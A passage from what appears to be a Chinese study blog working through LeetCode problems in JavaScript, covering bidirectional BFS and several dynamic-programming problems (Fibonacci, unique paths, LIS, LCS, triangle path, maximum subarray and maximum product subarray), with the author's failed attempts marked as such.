class="comment">// new_beginSet 存放扩散出来的点</span></span><br><span class="line">    <span class="keyword">let</span> new_beginSet = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> word <span class="keyword">of</span> beginSet) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; word.length; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> c = <span class="number">97</span>; c &lt;= <span class="number">122</span>; c++)&#123;</span><br><span class="line">          <span class="keyword">let</span> newWord = word.slice(<span class="number">0</span>, i) + <span class="built_in">String</span>.fromCharCode(c) + word.slice(i + <span class="number">1</span>);</span><br><span class="line">          <span class="keyword">if</span> (endSet.has(newWord)) &#123;</span><br><span class="line">            <span class="keyword">return</span> level + <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (wordListSet.has(newWord)) &#123;</span><br><span class="line">            new_beginSet.add(newWord);</span><br><span class="line">            wordListSet.delete(newWord);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    beginSet = new_beginSet;</span><br><span class="line">    level++;</span><br><span class="line">    <span class="comment">// 保证 beginSet 是最小的，对最小的进行扩散</span></span><br><span class="line">    <span class="keyword">if</span> (beginSet.size &gt; endSet.size) &#123;</span><br><span class="line">      [beginSet, endSet] = [endSet, beginSet];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="动态规划-Dynamic-Programming"><a href="#动态规划-Dynamic-Programming" class="headerlink" title="动态规划 Dynamic Programming"></a>动态规划 Dynamic Programming</h1><p>“Simplifying a complicated problem by breaking it down into simpler sub-problems”</p><p><strong>分治 + 最优子结构</strong></p><h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><p>动态规划和递归或者分治没有根本上的区别（关键看有无最优的子结构）</p><ul><li>共性：找到<strong>重复子问题</strong></li><li>差异性：最优子结构、中途可以<strong>淘汰次优解</strong></li></ul><h2 id="LeetCode509——斐波那契数（☆）（★）"><a href="#LeetCode509——斐波那契数（☆）（★）" class="headerlink" title="LeetCode509——斐波那契数（☆）（★）"></a>LeetCode509——斐波那契数（☆）（★）</h2><p><a href="https://leetcode-cn.com/problems/fibonacci-number/">跳转地址</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fib = <span class="function"><span class="keyword">function</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> n &lt;= <span class="number">1</span> ? n : fib(n - <span class="number">1</span>) + fib(n - <span class="number">2</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>但是这是傻递归，时间复杂度O（2^n）。</p><h3 id="思路1-amp-题解-3"><a href="#思路1-amp-题解-3" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><p>Memorization 记忆化搜索，即将过程结果存在数组中。（自底向上）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fib = <span class="function"><span class="keyword">function</span> (<span class="params">n, memo = []</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!memo[n]) &#123;</span><br><span class="line">        memo[n] = fib(n - <span class="number">1</span>, memo) + fib(n - <span class="number">2</span>, memo);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> memo[n];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="思路2-amp-题解-2"><a href="#思路2-amp-题解-2" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p>自底向上递推：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fib = <span class="function"><span class="keyword">function</span> (<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> a = [];</span><br><span class="line">    a[<span class="number">0</span>] = <span class="number">0</span>, a[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">2</span>; i &lt;= n; i++)&#123;</span><br><span class="line">        a[i] = a[i - <span class="number">1</span>] + a[i - <span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a[n];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode62——不同路径（☆）"><a href="#LeetCode62——不同路径（☆）" class="headerlink" title="LeetCode62——不同路径（☆）"></a>LeetCode62——不同路径（☆）</h2><p><a href="https://leetcode-cn.com/problems/unique-paths/">跳转地址</a></p><h3 id="自己的代码-11"><a href="#自己的代码-11" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> uniquePaths = <span class="function"><span class="keyword">function</span>(<span class="params">m, n, arr=[]</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (m === <span class="number">1</span> || n === <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!arr[m][n]) &#123;</span><br><span class="line">        arr[m][n] = uniquePaths(m - <span class="number">1</span>, n, arr) + uniquePaths(m, n - <span class="number">1</span>, arr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr[m][n];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>未AC。二维数组应该不能这样写。</p><h3 id="思路1-amp-题解-4"><a href="#思路1-amp-题解-4" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><p>递归：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> uniquePaths = <span class="function"><span class="keyword">function</span> (<span class="params">m, n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> memo = <span class="keyword">new</span> <span class="built_in">Array</span>(m + <span class="number">1</span>).fill(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; memo.length; i++) &#123;</span><br><span class="line">        memo[i] = <span class="keyword">new</span> <span class="built_in">Array</span>(n + <span class="number">1</span>).fill(-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> helper = <span class="function"><span class="keyword">function</span> (<span class="params">m, n, row, col, memo</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (row === m &amp;&amp; col === n) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (row &gt; m || col &gt; n) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (memo[row][col] === -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> rightPath = helper(m, n, row, col + <span class="number">1</span>, memo);</span><br><span class="line">            <span class="keyword">let</span> downPath = helper(m, n, row + <span class="number">1</span>, col, memo);</span><br><span class="line">            memo[row][col] = rightPath + downPath;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> memo[row][col];</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> helper(m, n, <span class="number">1</span>, <span class="number">1</span>, memo);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="思路2-amp-题解-3"><a href="#思路2-amp-题解-3" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p>动态规划：自底向上递推，左上方路径数＝右+下。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> uniquePaths = <span class="function">(<span class="params">m, n</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> dp = <span class="keyword">new</span> <span class="built_in">Array</span>(m + <span class="number">1</span>).fill(<span class="keyword">new</span> <span class="built_in">Array</span>(n + <span class="number">1</span>).fill(<span class="number">1</span>));</span><br><span class="line">    </span><br><span class="line">    dp[m][n] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> row = m - <span class="number">1</span>; row &gt; <span class="number">0</span>; row--)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> col = n - <span class="number">1</span>; col &gt; <span class="number">0</span>; col--)&#123;</span><br><span class="line">            dp[row][col] = dp[row + <span class="number">1</span>][col] + dp[row][col + <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> dp[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>方法二：从左上到右下：(这样方便多了、、)</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> uniquePaths = <span class="function">(<span class="params">m, n</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// dp 数组初始化</span></span><br><span class="line">    <span class="keyword">const</span> dp = <span class="keyword">new</span> <span class="built_in">Array</span>(m).fill(<span class="keyword">new</span> <span class="built_in">Array</span>(n).fill(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">        dp[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">        dp[<span class="number">0</span>][j] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; m; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> j = <span class="number">1</span>; j &lt; n; j++)&#123;</span><br><span class="line">            dp[i][j] = dp[i - <span class="number">1</span>][j] + dp[i][j - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[m - <span class="number">1</span>][n - <span class="number">1</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="思路3-amp-题解"><a href="#思路3-amp-题解" class="headerlink" title="思路3&amp;题解"></a>思路3&amp;题解</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> uniquePaths = <span class="function">(<span class="params">m, n</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// dp 数组初始化</span></span><br><span class="line">    <span class="keyword">const</span> dp = <span class="keyword">new</span> <span class="built_in">Array</span>(n).fill(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; m; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> j = <span class="number">1</span>; j &lt; n; j++)&#123;</span><br><span class="line">            dp[j] += dp[j - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[n - <span class="number">1</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>只用一位数组存储结果，更加节省空间。</p><h2 id="LeetCode63——不同路径II（☆）"><a href="#LeetCode63——不同路径II（☆）" class="headerlink" title="LeetCode63——不同路径II（☆）"></a>LeetCode63——不同路径II（☆）</h2><p><a href="https://leetcode-cn.com/problems/unique-paths-ii/">跳转地址</a></p><h3 id="自己的代码-12"><a href="#自己的代码-12" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> uniquePathsWithObstacles = <span class="function"><span class="keyword">function</span>(<span class="params">obstacleGrid</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> m = obstacleGrid.length, n = obstacleGrid[<span class="number">0</span>].length;</span><br><span class="line">    <span class="keyword">if</span> (obstacleGrid[m - <span class="number">1</span>][n - <span class="number">1</span>] === <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> dp = <span class="keyword">new</span> <span class="built_in">Array</span>(m).fill(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; dp.length; i++)&#123;</span><br><span class="line">        dp[i] = <span class="keyword">new</span> <span class="built_in">Array</span>(n).fill(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (obstacleGrid[i][n - <span class="number">1</span>] === <span class="number">0</span>) &#123;</span><br><span class="line">            dp[i][n - <span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (obstacleGrid[m - <span class="number">1</span>][i] === <span class="number">0</span>) &#123;</span><br><span class="line">            dp[m - <span class="number">1</span>][i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> row = m-<span class="number">2</span>; row &gt;= <span class="number">0</span>; row--)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> col = n-<span class="number">2</span>; col &gt;= <span class="number">0</span>; col--)&#123;</span><br><span class="line">            <span class="keyword">if</span> (obstacleGrid[row][col] === <span class="number">1</span>) &#123;</span><br><span class="line">                dp[row][col] = <span class="number">0</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                dp[row][col] = dp[row + <span class="number">1</span>][col] + dp[row][col + <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>未AC，头疼，调试了一个多小时也没弄出来。思路是从右下往左上递归。</p><h3 id="思路1-amp-题解-5"><a href="#思路1-amp-题解-5" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><p>这是从左上开始往右下递归：（这样就不用考虑 dp 数组与 obstacleGrid 数组的大小关系，比从右下开始递归方便多了）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> uniquePathsWithObstacles = <span class="function"><span class="keyword">function</span>(<span class="params">obstacleGrid</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> m = obstacleGrid.length, n = obstacleGrid[<span class="number">0</span>].length;</span><br><span class="line">    <span class="comment">// dp 数组初始化为0</span></span><br><span class="line">    <span class="keyword">const</span> dp = <span class="keyword">new</span> <span class="built_in">Array</span>(m).fill(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; dp.length; i++)&#123;</span><br><span class="line">        dp[i] = <span class="keyword">new</span> <span class="built_in">Array</span>(n).fill(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 初始化两条边，遇到障碍物则为0</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; m &amp;&amp; obstacleGrid[i][<span class="number">0</span>] === <span class="number">0</span>; i++) &#123;</span><br><span class="line">        dp[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; n &amp;&amp; obstacleGrid[<span class="number">0</span>][j] === <span class="number">0</span>; j++) &#123;</span><br><span class="line">        dp[<span class="number">0</span>][j] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 从左往右、从上到下遍历</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">            <span class="comment">// 遇到障碍，不执行当前操作，直接进入下一循环</span></span><br><span class="line">            <span class="keyword">if</span> (obstacleGrid[i][j] === <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            dp[i][j] = dp[i - <span class="number">1</span>][j] + dp[i][j - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[m - <span class="number">1</span>][n - <span class="number">1</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="思路2-amp-题解-4"><a href="#思路2-amp-题解-4" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p>一维数组：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> uniquePathsWithObstacles = <span class="function"><span class="keyword">function</span>(<span class="params">obstacleGrid</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> m = obstacleGrid.length, n = obstacleGrid[<span class="number">0</span>].length;</span><br><span class="line">    <span class="comment">// dp 数组初始化</span></span><br><span class="line">    <span class="keyword">const</span> dp = <span class="keyword">new</span> <span class="built_in">Array</span>(n).fill(<span class="number">0</span>);</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; n; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (obstacleGrid[i][j] === <span class="number">1</span>) &#123;</span><br><span class="line">                dp[j] = <span class="number">0</span>;</span><br><span class="line">                <span class="comment">// j &gt; 0 很关键</span></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(j &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                dp[j] += dp[j - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[n - <span class="number">1</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode300——最长递增子序列（☆☆）"><a href="#LeetCode300——最长递增子序列（☆☆）" class="headerlink" title="LeetCode300——最长递增子序列（☆☆）"></a>LeetCode300——最长递增子序列（☆☆）</h2><p><a href="https://leetcode-cn.com/problems/longest-increasing-subsequence/">跳转地址</a></p><h3 id="自己的代码-13"><a href="#自己的代码-13" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> lengthOfLIS = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> len = nums.length;</span><br><span class="line">    <span class="keyword">let</span> dp = <span class="keyword">new</span> <span class="built_in">Array</span>(len).fill(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[j] &lt; nums[i]) &#123;</span><br><span class="line">                dp[i] = <span class="built_in">Math</span>.max(dp[i], dp[j] + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Math</span>.max(...dp);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode1143——最长公共子序列（☆☆）"><a href="#LeetCode1143——最长公共子序列（☆☆）" class="headerlink" title="LeetCode1143——最长公共子序列（☆☆）"></a>LeetCode1143——最长公共子序列（☆☆）</h2><p><a href="https://leetcode-cn.com/problems/longest-common-subsequence/">跳转地址</a></p><h3 id="思路-amp-题解-6"><a href="#思路-amp-题解-6" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> longestCommonSubsequence = <span class="function"><span class="keyword">function</span>(<span class="params">text1, text2</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!text1 || !text2) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> m = text1.length, n = text2.length;</span><br><span class="line">    <span class="keyword">const</span> dp = <span class="keyword">new</span> <span class="built_in">Array</span>(m + <span class="number">1</span>).fill(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; dp.length; i++)&#123;</span><br><span class="line">        dp[i] = <span class="keyword">new</span> <span class="built_in">Array</span>(n + <span class="number">1</span>).fill(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt;= m; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">1</span>; j &lt;= n; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (text1[i - <span class="number">1</span>] === text2[j - <span class="number">1</span>]) &#123;</span><br><span class="line">                dp[i][j] = dp[i - <span class="number">1</span>][j - <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                dp[i][j] = <span class="built_in">Math</span>.max(dp[i][j - <span class="number">1</span>], dp[i - <span class="number">1</span>][j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[m][n];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/26/k85qZCWGbFUlzAf.png" alt="image.png"></p><p>要学会把这道题目变成二维数组的 dp 问题。</p><h2 id="LeetCode1143——三角形最小路径和（☆☆）（to-continue）"><a href="#LeetCode1143——三角形最小路径和（☆☆）（to-continue）" class="headerlink" title="LeetCode1143——三角形最小路径和（☆☆）（to continue）"></a>LeetCode1143——三角形最小路径和（☆☆）（to continue）</h2><p><a href="https://leetcode-cn.com/problems/triangle/">跳转地址</a></p><h3 id="思路1-amp-题解-6"><a href="#思路1-amp-题解-6" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><p>DP:</p><ul><li>重复性（分治） <code>problem(i, j) = min(sub(i+1, j), sub(i+1, j+1)) + a[i, j]</code></li><li>定义状态方程 <code>f[i, j]</code></li><li>DP方程 <code>f[i, j] = min(f[i+1, j], f[i+1, j+1]) + a[i, j]</code></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> minimumTotal = <span class="function"><span class="keyword">function</span>(<span class="params">triangle</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 直接将 triangle 存在 dp 中</span></span><br><span class="line">    <span class="keyword">let</span> dp = triangle;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = dp.length - <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; dp[i].length; j++)&#123;</span><br><span class="line">            dp[i][j] += <span class="built_in">Math</span>.min(dp[i + <span class="number">1</span>][j], dp[i + <span class="number">1</span>][j + <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其实甚至可以不设 dp 直接返回 triangle[0][0]。</p><h3 id="思路2-amp-题解-5"><a href="#思路2-amp-题解-5" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> minimumTotal = <span class="function"><span class="keyword">function</span> (<span class="params">triangle</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> res = triangle[triangle.length-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = triangle.length - <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; triangle[i].length; j++)&#123;</span><br><span class="line">            res[j] = <span class="built_in">Math</span>.min(res[j], res[j + <span class="number">1</span>]) + triangle[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res[<span class="number">0</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="LeetCode53——最大子序和（☆）"><a href="#LeetCode53——最大子序和（☆）" class="headerlink" title="LeetCode53——最大子序和（☆）"></a>LeetCode53——最大子序和（☆）</h2><p><a href="https://leetcode-cn.com/problems/maximum-subarray/">跳转地址</a></p><p>自己做只会暴力求解。。</p><h3 id="思路-amp-题解-7"><a href="#思路-amp-题解-7" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><ul><li>DP[i]表示 nums 中以 nums[i] 结尾的最大子序和，取决于 DP[i - 1] + nums[i] &gt; nums[i] ,如果 nums[i] 大，则从 nums[i] 开始单独成一段，否则与之前的连成一段。</li><li>所以可得 DP 方程 <code>dp[i] = Math.max(nums[i], dp[i - 1] + nums[i])</code> 。</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">maxSubArray</span>(<span class="params">nums: number[]</span>): <span class="title">number</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> dp = [...nums];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="comment">// 要么自成一段，要么和前面子数组合并</span></span><br><span class="line">        dp[i] = <span class="built_in">Math</span>.max(nums[i], dp[i - <span class="number">1</span>] + nums[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Math</span>.max(...dp);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>发现DP[i]其实只与DP[i - 1]有关（只用到了一个变量），所以可以用一个变量 pre 来替代 DP[i - 1]，从而让空间复杂度降低到 O(1)。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> maxSubArray = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> pre = <span class="number">0</span>, dp = nums[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        pre = <span class="built_in">Math</span>.max(pre + nums[i], nums[i]);</span><br><span class="line">        dp = <span class="built_in">Math</span>.max(dp, pre);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode152——乘积最大子序列（☆☆）"><a href="#LeetCode152——乘积最大子序列（☆☆）" class="headerlink" title="LeetCode152——乘积最大子序列（☆☆）"></a>LeetCode152——乘积最大子序列（☆☆）</h2><p><a href="https://leetcode-cn.com/problems/maximum-product-subarray/submissions/">跳转地址</a></p><p>自己写 DP 还是没有任何思路。</p><h3 id="思路-amp-题解-8"><a href="#思路-amp-题解-8" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> maxProduct = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> prevMax = nums[<span class="number">0</span>], prevMin = nums[<span class="number">0</span>], result = nums[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i=<span class="number">1</span>;i&lt;nums.length;i++) &#123;</span><br><span class="line">        curMax = <span class="built_in">Math</span>.max(nums[i] * prevMax, nums[i], nums[i] * prevMin);</span><br><span class="line">        <span class="comment">// 考虑负数情况，要算出最小值 因为最小值* 负数 可能就是变为最大值</span></span><br><span class="line">        curMin = <span class="built_in">Math</span>.min(nums[i] * prevMin, nums[i], nums[i] * prevMax);</span><br><span class="line">        prevMax = curMax</span><br><span class="line">        prevMin = curMin</span><br><span class="line"></span><br><span class="line">        result = <span class="built_in">Math</span>.max(curMax, result);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="LeetCode198——打家劫舍（☆☆）"><a href="#LeetCode198——打家劫舍（☆☆）" class="headerlink" title="LeetCode198——打家劫舍（☆☆）"></a>LeetCode198——打家劫舍（☆☆）</h2><p><a href="https://leetcode-cn.com/problems/house-robber/">跳转地址</a></p><h3 